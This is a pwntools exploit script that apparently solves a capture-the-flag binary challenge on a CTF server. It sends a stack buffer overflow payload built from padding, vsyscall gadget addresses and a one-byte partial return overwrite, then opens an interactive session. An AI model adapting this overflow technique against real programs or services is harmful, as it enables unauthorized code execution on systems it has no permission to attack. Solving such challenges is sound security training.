#!/usr/bin/python3
from pwn import *

context.log_level = "critical"
context.terminal = ["remotinator", "vsplit", "-x"]

exe = context.binary = ELF("./chall")
libc = exe.libc

def start(*pargs, **kwargs):
    if args.REMOTE:
        return remote("virtual.ctf.theromanxpl0.it", 7011)
    if args.GDB:
        return exe.debug(gdbscript="b*main+115\ncontinue",  *pargs, **kwargs)
    return exe.process(*pargs, **kwargs)

io = start(env = {"FLAG": r"TRX{example_flag}"})

"""
0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]

0xffffffffff600000:  mov    rax,0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
"""

vsyscall = 0xffffffffff600000

io.recvline()

payload = cyclic(40) + p64(vsyscall)*2 + b'\xa9'

io.send(payload)

io.interactive()
